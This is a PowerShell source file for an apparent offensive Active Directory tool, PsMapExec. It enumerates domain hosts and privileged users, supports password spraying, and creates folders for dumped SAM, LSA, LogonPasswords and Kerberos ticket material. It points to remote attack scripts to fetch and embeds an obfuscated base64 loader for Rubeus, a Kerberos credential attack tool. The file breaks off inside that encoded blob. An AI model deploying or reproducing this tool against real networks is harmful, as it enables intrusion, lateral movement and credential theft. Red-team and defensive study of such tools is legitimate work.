Function PsMapExec{


[CmdletBinding()]
Param(
    [Parameter(Mandatory=$False, Position=0, ValueFromPipeline=$true)]
    [String]$Command = '',

    [Parameter(Mandatory=$False, Position=1, ValueFromPipeline=$true)]
    [String]$Targets = '',

    [Parameter(Mandatory=$False, Position=2, ValueFromPipeline=$true)]
    [String]$Domain = "$env:USERDNSDOMAIN",

    [Parameter(Mandatory=$False, Position=3, ValueFromPipeline=$true)]
    [String]$Username = "",

    [Parameter(Mandatory=$True, Position=4, ValueFromPipeline=$true)]
    [String]$Method = "",

    [Parameter(Mandatory=$False, Position=5, ValueFromPipeline=$true)]
    [String]$Module = "",

    [Parameter(Mandatory=$False, Position=6, ValueFromPipeline=$true)]
    [String]$Hash = "",

    [Parameter(Mandatory=$False, Position=7, ValueFromPipeline=$true)]
    [String]$Password = "",

    [Parameter(Mandatory=$False, Position=8, ValueFromPipeline=$true)]
    [String]$AllDomains = "",

    [Parameter(Mandatory=$False, Position=9, ValueFromPipeline=$true)]
    [String]$UserDomain = "",

    [Parameter(Mandatory=$False, Position=10, ValueFromPipeline=$true)]
    [String]$LocalFileServer = "",

    [Parameter(Mandatory=$False, Position=11, ValueFromPipeline=$true)]
    [String]$Threads = "8",

    [Parameter(Mandatory=$False, Position=12, ValueFromPipeline=$true)]
    [switch]$Force,

    [Parameter(Mandatory=$False, Position=13, ValueFromPipeline=$true)]
    [switch]$LocalAuth,
    
    [Parameter(Mandatory=$False, Position=14, ValueFromPipeline=$true)]
    [switch]$CurrentUser,

    [Parameter(Mandatory=$False, Position=15, ValueFromPipeline=$true)]
    [switch]$SuccessOnly,

    [Parameter(Mandatory=$False, Position=16, ValueFromPipeline=$true)]
    [switch]$ShowOutput,

    [Parameter(Mandatory=$False, Position=17, ValueFromPipeline=$true)]
    [String]$Ticket = "",

    [Parameter(Mandatory=$False, Position=18, ValueFromPipeline=$true)]
    [Switch]$AccountAsPassword,

    [Parameter(Mandatory=$False, Position=19, ValueFromPipeline=$true)]
    [Switch]$EmptyPassword,

    [Parameter(Mandatory=$False, Position=20, ValueFromPipeline=$true)]
    [int]$Port = "",

    [Parameter(Mandatory=$False, Position=21, ValueFromPipeline=$true)]
    [Switch]$NoParse
)

# Check for mandatory parameter


$startTime = Get-Date
Set-Variable MaximumHistoryCount 32767

# Set the targets variable if not provided when spraying
if ($Method -eq "Spray" -and $Targets -eq ""){
$Targets = "all"
}

################################################################################################################
###################################### Banner and version information ##########################################
################################################################################################################

$Banner = @("
  _____   _____ __  __          _____  ________   ________ _____ 
 |  __ \ / ____|  \/  |   /\   |  __ \|  ____\ \ / /  ____/ ____|
 | |__) | (___ | \  / |  /  \  | |__) | |__   \ V /| |__ | |     
 |  ___/ \___ \| |\/| | / /\ \ |  ___/|  __|   > < |  __|| |     
 | |     ____) | |  | |/ ____ \| |    | |____ / . \| |___| |____ 
 |_|    |_____/|_|  |_/_/    \_\_|    |______/_/ \_\______\_____|
                                                                 
")

Write-Output $Banner
Write-Host "Github  : "  -NoNewline
Write-Host "https://github.com/The-Viper-One"
Write-Host "Version : " -NoNewline
Write-Host "0.4.0"
Write-Host

# If no targets have been provided
if (-not $Targets -and $Method -ne "Spray") {
    Write-host "[-]  " -ForegroundColor "Red" -NoNewline
    Write-host "You must provide a value for -targets (all, servers, DCs, Workstations)"
    return
}



################################################################################################################
####################################### Some logic based checking ##############################################
################################################################################################################

if ($Threads -lt 2){
        Write-Host "[!] " -ForegroundColor "Yellow" -NoNewline
        Write-Host "Threads value should not be less than 2"
        return
}

if ($Method -eq ""  -and !$SessionHunter -and !$Spray){
        Write-Host "[!] " -ForegroundColor "Yellow" -NoNewline
        Write-Host "No method specified"
        return
}


if ($Method -eq "RDP") {
    if ($Hash -ne "") {
        Write-Host "[!] " -ForegroundColor "Yellow" -NoNewline
        Write-Host "Hash authentication not currently supported with RDP"
        return
    }
    
    if ($Ticket -ne "") {
        Write-Host "[!] " -ForegroundColor "Yellow" -NoNewline
        Write-Host "Ticket authentication not currently supported with RDP"
        return
    }
    
    if ($CurrentUser -or $Username -eq "" -or $Password -eq "") {
        Write-Host "[!] " -ForegroundColor "Yellow" -NoNewline
        Write-Host "-Username and -Password parameters required when using the method RDP"
        return
    }
}


    if ($CurrentUser) {
        if ($Hash -ne "" -or $Password -ne "" -or $Username -ne "" -or $Ticket -ne "") {
            Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
            Write-Host "The switch -CurrentUser has been provided with a credential parameter ""e.g.: -Username, -Password"""
            Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
            Write-Host "PsMapExec will continue in the current users context """
            Start-Sleep -Seconds 5
        }
    }

if ($Method -eq "Spray"){$CurrentUser = $True}
if ($Method -eq "GenRelayList"){$CurrentUser = $True}

if ($Method -eq "VNC") {
    if ($Username -ne "" -or $Password -ne "" -or $Hash -ne "" -or $Ticket -ne "") {
        $CurrentUser = $True
        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
        Write-Host " Method VNC does not support authentication material, it simply checks if No Auth is enabled."
        Write-Host
        Start-sleep -Seconds 5
    }
 } 



# Check script modules
$InvokeRubeusLoaded = Get-Command -Name "Invoke-Rubeus" -ErrorAction "SilentlyContinue"

################################################################################################################
######################################### External Script variables ############################################
################################################################################################################

$PandemoniumURL = "https://raw.githubusercontent.com/The-Viper-One/PME-Scripts/main/Invoke-Pandemonium.ps1"
$KirbyURL = "https://raw.githubusercontent.com/The-Viper-One/PME-Scripts/main/Kirby.ps1"

# Check if $LocalFileServer is not NULL
if (![string]::IsNullOrEmpty($LocalFileServer)) {
    # Regular expression pattern to validate an IP address
    $ipRegex = '^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$'

    if ($LocalFileServer -match $ipRegex) {
        # Update URLs to use the provided local file server's IP address
        $PandemoniumURL = "http://$LocalFileServer/Invoke-Pandemonium.ps1"
        $KirbyURL = "http://$LocalFileServer/Kirby.ps1"
    }
    else {
        # If $LocalFileServer is not a valid IP address, show an error message and return
        Write-Host "[-] " -ForegroundColor "Red" -NoNewline
        Write-Host "The provided value '$LocalFileServer' is not a valid IP address."
        return
    }
}



################################################################################################################
########################################### Initial Directory Setup ############################################
################################################################################################################

$WorkingDirectory = (Get-Item -Path ".\").FullName

try {
    $testFilePath = Join-Path $WorkingDirectory "Test.PME"
    New-Item -ItemType "File" -Name "Test.PME" -Path $WorkingDirectory -Force -ErrorAction "Stop" | Out-Null
    Remove-Item -Path $testFilePath -Force | Out-Null
} catch {
    Write-Host "[!] " -ForegroundColor "Yellow" -NoNewline
    Write-Host "Current directory is not writable, change to a different directory and try again"
    return
}

$PME = Join-Path $WorkingDirectory "PME"
$SAM = Join-Path $PME "SAM"
$MSSQL = Join-Path $PME "MSSQL"
$LogonPasswords = Join-Path $PME "LogonPasswords"
$SMB = Join-Path $PME "SMB"
$Tickets = Join-Path $PME "Tickets"
$KerbDump = Join-Path $Tickets "KerbDump"
$MimiTickets = Join-Path $Tickets "MimiTickets"
$ekeys = Join-Path $PME "eKeys"
$LSA = Join-Path $PME "LSA"
$ConsoleHistory = Join-Path $PME "Console History"
$Sessions = Join-Path "$PME" "Sessions"
$UserFiles = Join-Path "$PME" "User Files"
$Spraying = Join-Path $PME "Spraying"
$VNC = Join-Path $PME "VNC"

  $directories = @(
    $PME, $SAM, $LogonPasswords, $MSSQL, $SMB, $Tickets, $ekeys, 
    $LSA, $KerbDump, $MimiTickets, $ConsoleHistory, $Sessions, 
    $UserFiles, $Spraying, $VNC
)

foreach ($directory in $directories) {
    if (-not (Test-Path $directory)) {
        New-Item -ItemType Directory -Force -Path $directory | Out-Null
        if ($directory -eq $PME) {
            Write-Host "[+] " -ForegroundColor "Green" -NoNewline
            Write-Host "Created directory for PME at $directory"
            Write-Host
            Start-sleep -seconds "3"
        }
    }
}

######### Checks if user context is administrative when a session is spawned #########
$CheckAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

################################################################################################################
########################################## Domain Target Acquisition ###########################################
################################################################################################################


if ($Method -ne "Spray"){
$directoryEntry = [ADSI]"LDAP://$domain"
$searcher = [System.DirectoryServices.DirectorySearcher]$directoryEntry
$searcher.PageSize = 1000
$searcher.PropertiesToLoad.AddRange(@("dnshostname", "operatingSystem"))

if ($Targets -eq "Workstations") {

$searcher.Filter = "(&(objectCategory=computer)(operatingSystem=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
$computers = $searcher.FindAll() | Where-Object { $_.Properties["operatingSystem"][0]  -notlike "*windows*server*" -and $_.Properties["dnshostname"][0] -ne "$env:COMPUTERNAME.$env:USERDNSDOMAIN" }

}
elseif ($Targets -eq "Servers") {

$searcher.Filter = "(&(objectCategory=computer)(operatingSystem=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
$computers = $searcher.FindAll() | Where-Object { $_.Properties["operatingSystem"][0]  -like "*server*" -and $_.Properties["dnshostname"][0] -ne "$env:COMPUTERNAME.$env:USERDNSDOMAIN" }

}
elseif ($Targets -eq "DC" -or $Targets -eq "DCs" -or $Targets -eq "DomainControllers" -or $Targets -eq "Domain Controllers") {

$searcher.Filter = "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
$computers = $searcher.FindAll()

}
elseif ($Targets -eq "All" -or $Targets -eq "Everything") {


$searcher.Filter = "(&(objectCategory=computer)(operatingSystem=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
$computers = $searcher.FindAll() | Where-Object { $_.Properties["dnshostname"][0] -ne "$env:COMPUTERNAME.$env:USERDNSDOMAIN" }`

}


elseif ($Method -ne "Spray"){
if ($Targets -is [string]) {
    $ipAddress = [System.Net.IPAddress]::TryParse($Targets, [ref]$null)
    if ($ipAddress) {
        Write-Host "IP Addresses not yet supported" -ForegroundColor "Red"
        break
    }
    else {
        
        if ($Targets -notlike "*.*") {
            $Targets = $Targets + "." + $Domain
        }
        
        $computers = $searcher.FindAll() | Where-Object { $_.Properties["dnshostname"][0] -in $Targets }
            
            }
        }
    }
}


# Dispose the searcher after use
$searcher.Dispose()



################################################################################################################
############################ Grab interesting users for various parsing functions ##############################
################################################################################################################

function New-Searcher {
    $directoryEntry = [ADSI]"LDAP://$domain"
    $searcher = [System.DirectoryServices.DirectorySearcher]$directoryEntry
    $searcher.PageSize = 1000
    return $searcher
}

# Fetch enabled users
$searcher = New-Searcher
$searcher.Filter = "(&(objectCategory=user)(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=2)(!userAccountControl:1.2.840.113556.1.4.803:=16))"
$searcher.PropertiesToLoad.AddRange(@("samAccountName"))

$users = $searcher.FindAll() | Where-Object { $_.Properties["samAccountName"] -ne $null }
$EnabledDomainUsers = $users | ForEach-Object { $_.Properties["samAccountName"][0] }

# Fetch members of a group
function Get-GroupMembers {
    param (
        [Parameter(Mandatory = $true)]
        [string]$GroupName
    )

    $searcher = New-Searcher
    $searcher.Filter = "(&(objectCategory=group)(cn=$GroupName))"
    $searcher.PropertiesToLoad.AddRange(@("member"))
    $groups = $searcher.FindAll()

    $members = @()

    foreach ($group in $groups) {
        $group.Properties["member"] | ForEach-Object {
            $userDN = $_.ToString()
            $user = [ADSI]"LDAP://$userDN"
            $samAccountName = $user.Properties["samaccountname"] -as [array]
            if ($samAccountName) {
                $members += $samAccountName[0]
            }
        }
    }
    
    return $members
}

$DomainAdmins = Get-GroupMembers -GroupName "Domain Admins"
$EnterpriseAdmins = Get-GroupMembers -GroupName "Enterprise Admins" -ErrorAction SilentlyContinue
$ServerOperators = Get-GroupMembers -GroupName "Server Operators" -ErrorAction SilentlyContinue
$AccountOperators = Get-GroupMembers -GroupName "Account Operators" -ErrorAction SilentlyContinue

$FQDNDomainName = $domain.ToLower()
$FQDNDomainPlusDomainAdmins = $DomainAdmins | ForEach-Object { "$FQDNDomainName\$_" }
$FQDNDomainPlusEnterpriseAdmins = $EnterpriseAdmins | ForEach-Object { "$FQDNDomainName\$_" }
$FQDNDomainPlusServerOperators = $ServerOperators | ForEach-Object { "$FQDNDomainName\$_" }
$FQDNDomainPlusAccountOperators = $AccountOperators | ForEach-Object { "$FQDNDomainName\$_" }

if ($Method -eq "Spray") {
    if ($Targets -eq "" -or $Targets -eq "all" -or $Targets -eq "Domain Users") {
        $Targets = $EnabledDomainUsers
    }
    elseif ($Targets -in $EnabledDomainUsers) {
        $EnabledDomainUsers = $Targets
    }
    else {
        $groupMembers = Get-GroupMembers -GroupName $Targets
        if ($groupMembers.Count -gt 0) {
            $EnabledDomainUsers = $groupMembers
        }
        elseif ($groupMembers.Count -eq 0) {
            Write-host "[-] " -ForegroundColor "Red" -NoNewline
            Write-host "Group either does not exist or is empty"
            return
        }
        else {
            Write-host "[-] " -ForegroundColor "Red" -NoNewline
            Write-Host "Unspecified Error"
            return
        }
    }
}




# Grab Computer Accounts for spraying
function Get-ComputerAccounts {
    $searcher = New-Searcher
    $searcher.Filter = "(&(objectClass=computer)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
    $searcher.PropertiesToLoad.Add("samAccountName") | Out-Null
    
    try {
        $ComputerSamAccounts = $searcher.FindAll() | ForEach-Object { $_.Properties["samAccountName"][0] }
        return $ComputerSamAccounts
    } catch {
        Write-Error "Failed to fetch computer accounts. Error: $_"
        return $null
    }
}

$ComputerSamAccounts = Get-ComputerAccounts
$searcher.Dispose()



if (!$LocalAuth){
if ($Method -ne "RDP"){
if (!$Force){
foreach ($EnterpriseAdmin in $EnterpriseAdmins){
        $splitResult = $Username -split [regex]::Escape($EnterpriseAdmin)
        if ($splitResult.Count -gt 1) {
        Write-Host "[!] " -ForegroundColor "Yellow" -NoNewline
        Write-Host "Specified user is a Enterprise Admin. Use the -Force switch to override"
        return
        }
    }
}

if (!$Force) {
    foreach ($DomainAdmin in $DomainAdmins) {
        $splitResult = $Username -split [regex]::Escape($DomainAdmin)
        if ($splitResult.Count -gt 1) {
            Write-Host "[!] " -ForegroundColor "Yellow" -NoNewline
            Write-Host "Specified user is a Domain Admin. Use the -Force switch to override"
            return
            }
        }
    }
}

if (!$CurrentUser) {
    if ($Method -ne "GenRelayList") {
        if ($Method -ne "SessionHunter"){
         if ($Method -ne "Spray"){
        try {
            $directoryEntry = [ADSI]"LDAP://$domain"
            $searcher = [System.DirectoryServices.DirectorySearcher]$directoryEntry
            $searcher.Filter = "(&(objectCategory=user)(samAccountName=$Username))"
            $searcher.PropertiesToLoad.AddRange(@("samAccountName"))
            $user = $searcher.FindOne()
            $domainUser = $user.Properties["samAccountName"]
        }
        Catch {
           
           if ($Ticket -ne $null){} 
            elseif (!$DomainUser) {
                Write-Host "[!] " -ForegroundColor "Yellow" -NoNewline
                Write-Host "Specified username is not a valid domain user"
                return
                
                        }
                    }
                }
            }
        }
    }
}



################################################################################################################
################################### Loads ticket functions into memory #########################################
################################################################################################################

if ($InvokeRubeusLoaded.Name -ne "Invoke-Rubeus"){
function Invoke-Rubeus{
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, Mandatory = $true)]
        [ValidateNotNullorEmpty()]
        [String]
        $Command
    )
    $a=New-Object IO.MemoryStream(,[Convert]::FromBAsE64String("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